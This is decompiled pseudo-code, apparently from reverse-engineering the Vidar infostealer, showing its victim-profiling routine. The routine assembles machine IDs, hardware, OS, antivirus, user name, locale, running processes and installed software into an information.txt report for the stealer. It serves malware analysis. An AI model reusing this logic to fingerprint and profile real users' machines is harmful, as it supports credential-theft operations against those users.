void *__stdcall vdr_collect_victim_system_info()
{
  ctx_final = g_ctx_final;
  memset(strCollectedVictimInfos, 0, sizeof(strCollectedVictimInfos));
  lstrcatA(strCollectedVictimInfos, str_Version__);// Version: 
  strVidarVersion = vdr_assign_vidar_version(&strTemp);// "2.4
  dwTemp = 0;
  if ( strVidarVersion->_Myres >= 0x10 )
    strVidarVersion = (std_string *)strVidarVersion->u._Ptr;
  lstrcatA(strCollectedVictimInfos, strVidarVersion->u._Buf);
  dwTemp = 0xFFFFFFFF;
  if ( strTemp._Myres >= 0x10 )
    operator delete(strTemp.u._Ptr);
  strTemp._Myres = 0xF;
  strTemp._Mysize = 0;
  strTemp.u._Buf[0] = 0;
  lstrcatA(strCollectedVictimInfos, "\n\n");
  lstrcatA(strCollectedVictimInfos, str_Date__);// Date: 
  procHeapHdl = GetProcessHeap_0();
  strLocalDateTime = (const CHAR *)HeapAlloc_0(procHeapHdl, v28, v29);
  GetLocalTime((LPSYSTEMTIME)(&strTemp.u._Ptr + 3));
  wsprintfA(
    strLocalDateTime,
    "%d/%d/%d %d:%d:%d",
    HIWORD(strTemp._Mysize),
    *((unsigned __int16 *)&strTemp.u._Ptr + 7),
    *((unsigned __int16 *)&strTemp.u._Ptr + 6),
    LOWORD(strTemp._Myres),
    HIWORD(strTemp._Myres),
    v35);
  lstrcatA(strCollectedVictimInfos, strLocalDateTime);
  lstrcatA(strCollectedVictimInfos, "\n");
  lstrcatA(strCollectedVictimInfos, str_MachineID__);// MachineID:
  strMachineID = vdr_retrieve_MachineID_from_registry(&strTemp);
  dwTemp = 1;
  if ( strMachineID->_Myres >= 0x10 )
    strMachineID = (std_string *)strMachineID->u._Ptr;
  lstrcatA(strCollectedVictimInfos, strMachineID->u._Buf);
  dwTemp = 0xFFFFFFFF;
  if ( strTemp._Myres >= 0x10 )
    operator delete(strTemp.u._Ptr);
  strTemp._Myres = 0xF;
  strTemp._Mysize = 0;
  strTemp.u._Buf[0] = 0;
  lstrcatA(strCollectedVictimInfos, "\n");
  lstrcatA(strCollectedVictimInfos, str_GUID__);// GUID: 
  strVictimGUID = vdr_retrieve_guid_for_current_hwprofile(&strTemp);
  dwTemp = 2;
  if ( strVictimGUID->_Myres >= 0x10 )
    strVictimGUID = (std_string *)strVictimGUID->u._Ptr;
  lstrcatA(strCollectedVictimInfos, strVictimGUID->u._Buf);
  dwTemp = 0xFFFFFFFF;
  if ( strTemp._Myres >= 0x10 )
    operator delete(strTemp.u._Ptr);
  strTemp._Myres = 0xF;
  strTemp._Mysize = 0;
  strTemp.u._Buf[0] = 0;
  lstrcatA(strCollectedVictimInfos, "\n");
  lstrcatA(strCollectedVictimInfos, str_HWID__);// HWID:
  strVictimHWID = vdr_retrieve_volume_serial_info(&strTemp);
  dwTemp = 3;
  if ( strVictimHWID->_Myres >= 0x10 )
    strVictimHWID = (std_string *)strVictimHWID->u._Ptr;
  lstrcatA(strCollectedVictimInfos, strVictimHWID->u._Buf);
  dwTemp = 0xFFFFFFFF;
  if ( strTemp._Myres >= 0x10 )
    operator delete(strTemp.u._Ptr);
  strTemp._Myres = 0xF;
  strTemp._Mysize = 0;
  strTemp.u._Buf[0] = 0;
  lstrcatA(strCollectedVictimInfos, "\n\n");
  lstrcatA(strCollectedVictimInfos, str_Path__);// Path:
  dwCurrProcessId = GetCurrentProcessId_0();
  str_process_full_path = vdr_retrieve_process_full_path(&strTemp, dwCurrProcessId);
  dwTemp = 4;
  if ( str_process_full_path->_Myres >= 0x10 )
    str_process_full_path = (std_string *)str_process_full_path->u._Ptr;
  lstrcatA(strCollectedVictimInfos, str_process_full_path->u._Buf);
  dwTemp = 0xFFFFFFFF;
  if ( strTemp._Myres >= 0x10 )
    operator delete(strTemp.u._Ptr);
  strTemp._Myres = 0xF;
  strTemp._Mysize = 0;
  strTemp.u._Buf[0] = 0;
  lstrcatA(strCollectedVictimInfos, "\n");
  lstrcatA(strCollectedVictimInfos, str_Work_Dir__In_memory);// Work Dir: In memory
  lstrcatA(strCollectedVictimInfos, "\n\n");
  lstrcatA(strCollectedVictimInfos, str_Windows__);// Windows:
  strVictimOsName = vdr_retrieve_victim_os_name();
  lstrcatA(strCollectedVictimInfos, strVictimOsName);
  lstrcatA(strCollectedVictimInfos, " [");
  pcbBuffer = 0;
  currProcessHdl = GetCurrentProcess_0();
  IsWow64Process(currProcessHdl, v30);
  lstrcatA(strCollectedVictimInfos, "x86");
  lstrcatA(strCollectedVictimInfos, "]\n");
  lstrcatA(strCollectedVictimInfos, "Install date: ");
  str_InstallDate = vdr_retrieve_install_date_using_COM();
  lstrcatA(strCollectedVictimInfos, str_InstallDate);
  lstrcatA(strCollectedVictimInfos, "\n");
  lstrcatA(strCollectedVictimInfos, "AV: ");
  str_AV_Name = vdr_retrieve_av_name();
  lstrcatA(strCollectedVictimInfos, str_AV_Name->u._Buf);
  lstrcatA(strCollectedVictimInfos, "\n");
  lstrcatA(strCollectedVictimInfos, str_Computer_Name__);// Computer Name:
  str_ComputerName = vdr_retrieve_computer_name();
  lstrcatA(strCollectedVictimInfos, str_ComputerName);
  lstrcatA(strCollectedVictimInfos, "\n");
  lstrcatA(strCollectedVictimInfos, str_User_Name__);// User Name:
  pcbBuffer = 0x101;
  GetUserNameA(str_UserName, &pcbBuffer);
  lstrcatA(strCollectedVictimInfos, str_UserName);
  lstrcatA(strCollectedVictimInfos, "\n");
  lstrcatA(strCollectedVictimInfos, str_Display_Resolution__);// Display Resolution:
  strDisplayResolution = vdr_retrieve_display_solution(&strTemp);
  dwTemp = 5;
  if ( strDisplayResolution->_Myres >= 0x10 )
    strDisplayResolution = (std_string *)strDisplayResolution->u._Ptr;
  lstrcatA(strCollectedVictimInfos, strDisplayResolution->u._Buf);
  dwTemp = 0xFFFFFFFF;
  if ( strTemp._Myres >= 0x10 )
    operator delete(strTemp.u._Ptr);
  strTemp._Myres = 0xF;
  strTemp._Mysize = 0;
  strTemp.u._Buf[0] = 0;
  lstrcatA(strCollectedVictimInfos, "\n");
  lstrcatA(strCollectedVictimInfos, str_Display_Language__);// Display Language:
  str_DisplayLanguage = vdr_retrieve_victim_locale(&strTemp);
  dwTemp = 6;
  if ( str_DisplayLanguage->_Myres >= 0x10 )
    str_DisplayLanguage = (std_string *)str_DisplayLanguage->u._Ptr;
  lstrcatA(strCollectedVictimInfos, str_DisplayLanguage->u._Buf);
  dwTemp = 0xFFFFFFFF;
  if ( strTemp._Myres >= 0x10 )
    operator delete(strTemp.u._Ptr);
  strTemp._Myres = 0xF;
  strTemp._Mysize = 0;
  strTemp.u._Buf[0] = 0;
  lstrcatA(strCollectedVictimInfos, "\n");
  lstrcatA(strCollectedVictimInfos, str_Keyboard_Languages__);// Keyboard Languages:
  strKeyboardLang = vdr_retrieve_keyboard_lang();
  lstrcatA(strCollectedVictimInfos, strKeyboardLang);
  lstrcatA(strCollectedVictimInfos, "\n");
  lstrcatA(strCollectedVictimInfos, str_Local_Time__);// Local Time:
  procHeapHdl = GetProcessHeap_0();
  strLocalTime = (const CHAR *)HeapAlloc_0(procHeapHdl, v26, v27);
  GetLocalTime((LPSYSTEMTIME)(&strTemp.u._Ptr + 3));
  wsprintfA(
    strLocalTime,
    "%d/%d/%d %d:%d:%d",
    HIWORD(strTemp._Mysize),
    *((unsigned __int16 *)&strTemp.u._Ptr + 7),
    *((unsigned __int16 *)&strTemp.u._Ptr + 6),
    LOWORD(strTemp._Myres),
    HIWORD(strTemp._Myres),
    v35);
  lstrcatA(strCollectedVictimInfos, strLocalTime);
  lstrcatA(strCollectedVictimInfos, "\n");
  lstrcatA(strCollectedVictimInfos, str_TimeZone__);// TimeZone: 
  str_TimeZone = vdr_retrieve_time_zone(&strTemp);
  dwTemp = 7;
  if ( str_TimeZone->_Myres >= 0x10 )
    str_TimeZone = (std_string *)str_TimeZone->u._Ptr;
  lstrcatA(strCollectedVictimInfos, str_TimeZone->u._Buf);
  dwTemp = 0xFFFFFFFF;
  if ( strTemp._Myres >= 0x10 )
    operator delete(strTemp.u._Ptr);
  strTemp._Myres = 0xF;
  strTemp._Mysize = 0;
  strTemp.u._Buf[0] = 0;
  lstrcatA(strCollectedVictimInfos, "\n\n");
  lstrcatA(strCollectedVictimInfos, str__Hardware_);// [Hardware]
  lstrcatA(strCollectedVictimInfos, "\n");
  lstrcatA(strCollectedVictimInfos, str_Processor__);// Processor:
  str_ProcessorName = vdr_retrieve_processor_name();
  lstrcatA(strCollectedVictimInfos, str_ProcessorName);
  lstrcatA(strCollectedVictimInfos, "\n");
  lstrcatA(strCollectedVictimInfos, "Cores: ");
  dwprocessorCount = vdr_retrieve_num_cores_of_processor();
  str_Cores = sub_425670(&strTemp, dwprocessorCount);
  dwTemp = 8;
  if ( str_Cores->_Myres >= 0x10 )
    str_Cores = (std_string *)str_Cores->u._Ptr;
  lstrcatA(strCollectedVictimInfos, str_Cores->u._Buf);
  dwTemp = 0xFFFFFFFF;
  if ( strTemp._Myres >= 0x10 )
    operator delete(strTemp.u._Ptr);
  strTemp._Myres = 0xF;
  strTemp._Mysize = 0;
  strTemp.u._Buf[0] = 0;
  lstrcatA(strCollectedVictimInfos, "\n");
  lstrcatA(strCollectedVictimInfos, "Threads: ");
  str_Threads = vdr_retrieve_number_of_processors(&strTemp);
  dwTemp = 9;
  if ( str_Threads->_Myres >= 0x10 )
    str_Threads = (std_string *)str_Threads->u._Ptr;
  lstrcatA(strCollectedVictimInfos, str_Threads->u._Buf);
  dwTemp = 0xFFFFFFFF;
  if ( strTemp._Myres >= 0x10 )
    operator delete(strTemp.u._Ptr);
  strTemp._Myres = 0xF;
  strTemp._Mysize = 0;
  strTemp.u._Buf[0] = 0;
  lstrcatA(strCollectedVictimInfos, "\n");
  lstrcatA(strCollectedVictimInfos, str_RAM__); // RAM: 
  str_RAM = vdr_retrieve_RAM_info();
  lstrcatA(strCollectedVictimInfos, str_RAM);
  lstrcatA(strCollectedVictimInfos, "\n");
  lstrcatA(strCollectedVictimInfos, str_VideoCard__);// VideoCard:
  DisplayDevice.cb = 0x1A8;
  EnumDisplayDevicesA(0, 0, &DisplayDevice, 1u);
  lstrcatA(strCollectedVictimInfos, DisplayDevice.DeviceString);
  lstrcatA(strCollectedVictimInfos, "\n\n");
  lstrcatA(strCollectedVictimInfos, str__Processes_);// [Processes]
  lstrcatA(strCollectedVictimInfos, "\n");
  vdr_retrieve_all_running_processes(strCollectedVictimInfos);
  lstrcatA(strCollectedVictimInfos, "\n");
  lstrcatA(strCollectedVictimInfos, str__Software_);// [Software]
  lstrcatA(strCollectedVictimInfos, "\n");
  vdr_retrieve_installed_software_version(strCollectedVictimInfos);
  dwCollectedVictimInfoLen = lstrlenA(strCollectedVictimInfos);
  if ( ctx_final )
  {
    if ( ctx_final->dwValue_2 == 2 )
      g_dwCreatedFileMappingObj = vdr_create_file_to_save_data(
                                    ctx_final->p_ctx,
                                    strCollectedVictimInfos,
                                    str__information_txt,
                                    dwCollectedVictimInfoLen,
                                    3);
    else
      g_dwCreatedFileMappingObj = 0x80000;
  }
  else
  {
    g_dwCreatedFileMappingObj = 0x10000;
  }
  return memset(strCollectedVictimInfos, 0, sizeof(strCollectedVictimInfos));
}
